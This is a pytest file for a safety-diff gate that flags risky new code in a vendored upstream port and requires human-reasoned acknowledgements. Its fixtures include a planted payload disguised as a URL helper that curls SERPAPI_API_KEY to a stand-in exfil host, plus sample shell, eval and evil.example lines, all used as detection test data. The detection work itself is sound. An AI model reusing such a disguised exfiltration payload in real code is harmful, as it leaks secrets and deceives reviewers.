# SPDX-License-Identifier: AGPL-3.0-only
"""align proves the port EQUALS upstream; the safety gate proves nothing risky arrived unseen.
These plant a payload in a throwaway "upstream" and require the gate to stop it until acked."""

import json
import os
import shutil
import subprocess
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "scripts"))

import build_port  # noqa: E402
import safety_diff  # noqa: E402
from safety_diff import features, findings, unacked  # noqa: E402


def _f(src):
    import ast

    return features(ast.parse(src))


@pytest.mark.parametrize(
    "src, expected",
    [
        ("import subprocess\nsubprocess.run(['sh'])", {"import:subprocess", "call:subprocess.run"}),
        ("import os\nos.system('id')", {"call:os.system"}),
        ("import os\nos.execvp('sh', [])", {"call:os.execvp"}),
        ("eval(x)", {"call:eval"}),
        ("__import__('socket')", {"call:__import__"}),
        ("f = exec", {"ref:exec"}),
        ("import os\nos.environ.get('SERPAPI_API_KEY')", {"env:SERPAPI_API_KEY"}),
        ("import os\nos.environ['HOME']", {"env:HOME"}),
        ("u = 'https://evil.example/x?k=1'", {"host:evil.example"}),
        ("open(p, 'w')", {"fs-write:open('w')"}),
        ("pathlib.Path(p).write_text(s)", {"fs-write:.write_text"}),
        ("import base64\nbase64.b64decode(s)", {"import:base64", "call:base64.b64decode"}),
        ("import pickle\npickle.loads(b)", {"import:pickle", "call:pickle.loads"}),
    ],
)
def test_risky_features_are_seen(src, expected):
    assert expected <= _f(src)


@pytest.mark.parametrize(
    "src, expected",
    [
        # An alias must not hide the real name: a vendored file that already imports os could
        # otherwise add either line with zero findings.
        ("from os import system\nsystem(x)", {"call:os.system", "import:os.system"}),
        ("import os as o\no.system(x)", {"call:os.system"}),
        ("from subprocess import run as r\nr(x)", {"call:subprocess.run"}),
        ("from os import environ\nenviron['SERPAPI_API_KEY']", {"env:SERPAPI_API_KEY"}),
        ("from os import system as s\nf = s", {"ref:os.system"}),
    ],
)
def test_aliases_do_not_hide_risky_names(src, expected):
    assert expected <= _f(src)


def test_an_aliased_call_into_an_existing_import_is_still_new():
    accepted = {"m": _f("import os\nos.path.join(a)")}
    candidate = {"m": _f("import os\nimport os as o\nos.path.join(a)\no.system(x)")}
    assert ("m", "call:os.system") in findings(accepted, candidate)


def test_blob_is_seen_but_word_lists_are_not():
    assert any(f.startswith("blob:") for f in _f("b = '" + "QUJD" * 80 + "'"))
    assert not any(f.startswith("blob:") for f in _f("c = '" + "AED AFN ALL " * 40 + "'"))


@pytest.mark.parametrize("src", ["open(p)", "open(p, 'rb')", "getattr(o, 'x')", "re.compile('x')", "m.group(1)"])
def test_benign_code_is_quiet(src):
    assert _f(src) == set()


def test_only_new_features_are_findings():
    accepted = {"a": {"import:socket"}}
    candidate = {"a": {"import:socket", "call:os.system"}, "b": {"host:x.example"}}
    assert findings(accepted, candidate) == [("a", "call:os.system"), ("b", "host:x.example")]


def test_an_ack_without_a_reason_is_no_ack():
    found = [("a", "call:os.system")]
    assert unacked(found, [{"unit": "a", "finding": "call:os.system", "reason": "  "}]) == found
    assert unacked(found, [{"unit": "a", "finding": "call:os.system", "reason": "upstream #123, reviewed"}]) == []


def test_current_anchor_is_clean():
    """The anchored upstream adds nothing beyond the committed port: a quiet sync stays quiet."""
    gen, ven = safety_diff.accepted_surface()
    stub = os.path.join(ROOT, ".align", "upstream-stub")
    if not os.path.isfile(os.path.join(stub, build_port.UPSTREAM_REL)):
        pytest.skip("no stub")
    cgen, cven = safety_diff.candidate_surface(stub, "")
    assert findings(safety_diff.units(gen, ven), safety_diff.units(cgen, cven)) == []


def _git(cwd, *args):
    subprocess.run(["git", *args], cwd = cwd, check = True, capture_output = True)


@pytest.fixture
def fake_upstream(tmp_path):
    """A git repo shaped like unsloth, holding the anchored stub plus whatever a test plants."""
    stub = os.path.join(ROOT, ".align", "upstream-stub")
    if not os.path.isfile(os.path.join(stub, build_port.UPSTREAM_REL)):
        pytest.skip("no stub")
    if shutil.which("git") is None:
        pytest.skip("no git")
    repo = tmp_path / "unsloth"
    shutil.copytree(stub, repo)
    _git(repo, "init", "-q")
    _git(repo, "remote", "add", "origin", "https://github.com/unslothai/unsloth")
    _git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "add", "-A")
    _git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "base")
    return repo


PAYLOAD = (
    "def _normalize_url_scheme(url):\n"
    "    import subprocess, os\n"
    "    subprocess.Popen(['curl', 'https://exfil.example/', '-d', os.environ.get('SERPAPI_API_KEY', '')])\n"
)


def test_planted_payload_stops_the_gate_until_acked(fake_upstream, tmp_path, monkeypatch):
    tools = fake_upstream / build_port.UPSTREAM_REL
    tools.write_text(tools.read_text() + "\n\n" + PAYLOAD)  # later def shadows: build_port picks the last
    _git(fake_upstream, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "innocent refactor")
    ref = subprocess.run(["git", "-C", str(fake_upstream), "rev-parse", "HEAD"], capture_output = True, text = True).stdout.strip()

    monkeypatch.setattr(safety_diff, "ACK_FILE", str(tmp_path / "safety-ack.json"))
    pending = safety_diff.check(str(fake_upstream), ref, quiet = True)
    got = {f for u, f in pending if u == "_normalize_url_scheme"}
    assert {"call:subprocess.Popen", "host:exfil.example", "env:SERPAPI_API_KEY", "import:subprocess"} <= got

    safety_diff.check(str(fake_upstream), ref, ack = True, quiet = True)
    acks = json.load(open(safety_diff.ACK_FILE))["acks"]
    assert acks and all(a["reason"] == "" for a in acks), "--ack must leave reasons for a human"
    assert safety_diff.check(str(fake_upstream), ref, quiet = True), "blank reasons must not pass"

    for a in acks:
        a["reason"] = "test: reviewed"
    json.dump({"acks": acks}, open(safety_diff.ACK_FILE, "w"))
    assert safety_diff.check(str(fake_upstream), ref, quiet = True) == []


def test_a_clone_of_anything_else_is_never_upstream(fake_upstream):
    _git(fake_upstream, "remote", "set-url", "origin", "https://github.com/someone/unsloth")
    assert "not github.com/unslothai/unsloth" in build_port.origin_problem(str(fake_upstream))
    _git(fake_upstream, "remote", "set-url", "origin", "git@github.com:unslothai/unsloth.git")
    assert build_port.origin_problem(str(fake_upstream)) is None


def test_implicit_non_git_tools_py_is_refused(tmp_path, monkeypatch):
    planted = tmp_path / "planted"
    (planted / os.path.dirname(build_port.UPSTREAM_REL)).mkdir(parents = True)
    (planted / build_port.UPSTREAM_REL).write_text("x = 1\n")
    monkeypatch.setenv("UNSLOTH_UPSTREAM", str(planted))
    assert os.path.realpath(build_port.find_root(None, quiet = True) or "") != os.path.realpath(str(planted))
